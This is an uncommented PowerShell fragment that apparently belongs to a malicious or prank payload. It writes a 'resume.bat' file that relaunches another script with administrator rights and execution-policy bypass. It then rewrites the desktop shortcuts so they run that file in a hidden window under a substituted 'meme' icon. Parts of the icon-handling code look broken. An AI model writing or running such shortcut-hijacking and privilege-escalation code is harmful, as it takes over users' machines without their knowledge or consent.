$memeIcon = [System.IO.Path]::GetTempFileName() + ".ico"
[System.IO.File]::WriteAllBytes($memeIcon, [System.Convert]::FromBase64String($iconFile))

$docsPath = [Environment]::GetFolderPath("MyDocuments")
$batPath = Join-Path -Path $docsPath -ChildPath "resume.bat"
$batContent = @"
@echo off
PowerShell.exe -Command "& {Start-Process PowerShell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""$mainPath""' -Verb RunAs}"
"@
$batContent | Out-File -FilePath $batPath -Encoding ascii

$desktopPath = [Environment]::GetFolderPath("Desktop")
$lnkFiles = Get-ChildItem -Path $desktopPath -Filter ".lnk" -File | Select-Object -ExpandProperty FullName

$shell = New-Object -ComObject WScript.Shell
$shellApp = New-Object -ComObject Shell.Application

foreach ($lnkFile in $lnkFiles) 
{
    try {
        $shortcut = $shell.CreateShortcut($lnkFile)

        $shortcut.WindowStyle = 0
        $shortcut.TargetPath = $batPath

        $iconLocation = $null
        $iconIndex = 0

        if (-not [string]::IsNullOrEmpty($shortcut.IconLocation)) 
        {
            $iconLocation = $shellApp.NameSpace($shortcut.IconLocation)::GetFolderPath
            $iconIndex = $shellApp.NameSpace($shortcut.$iconLocation).GetDetailsOf($shellApp.NameSpace($shortcut.IconLocation).ParseName($lnkFile.Name), 167)
        }

        $shortcut.IconLocation = $memeIcon
        $shortcut.IconIndex = 0

        $shortcut.Save()
    }
    catch {
        Write-Host "Error modifying shortcut: $($_.Exception.Message)"
    }
}
$shell = $null
$shellApp = $null